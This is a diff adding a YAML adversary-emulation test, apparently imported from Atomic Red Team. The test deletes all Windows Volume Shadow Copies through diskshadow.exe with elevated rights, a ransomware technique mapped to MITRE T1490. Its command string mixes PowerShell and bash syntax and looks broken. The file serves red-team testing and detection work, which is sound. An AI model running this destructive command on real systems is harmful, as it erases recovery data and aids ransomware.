@@ -1,0 +1,43 @@
+- id: 42111a6f-7e7f-482c-9b1b-3cfd090b999c
+  name: Windows - Delete Volume Shadow Copies via Diskshadow
+  description: Deletes Windows Volume Shadow Copies via Diskshadow binary. This technique
+    is used by numerous ransomware families such as Crytox. The binary is present
+    by default in Windows Server operating systems (since Windows Server 2008). Upon
+    execution, it will delete all shadow copies of the server.
+  tactic: impact
+  technique:
+    attack_id: T1490
+    name: Inhibit System Recovery
+  platforms:
+    windows:
+      psh:
+        command: 'if(!(vssadmin.exe list shadows | findstr "No items found that satisfy
+          the query.")) { exit 0 } else { exit 1 }; then : ; else vssadmin.exe create
+          shadow /for=c:; fi; "delete shadows all" | diskshadow.exe'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - impact
+  - t1490
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    dependencies:
+    - description: 'Create volume shadow copy of C:\ . This prereq command only works
+        on Windows Server or Windows 8.
+
+        '
+      prereq_command: 'if(!(vssadmin.exe list shadows | findstr "No items found that
+        satisfy the query.")) { exit 0 } else { exit 1 }
+
+        '
+      get_prereq_command: 'vssadmin.exe create shadow /for=c:
+
+        '
+    technique_created: '2019-04-02T13:54:43.136Z'
+    atomic_guid: 42111a6f-7e7f-482c-9b1b-3cfd090b999c
+    import_timestamp: '2026-01-08T03:30:33.014201Z'
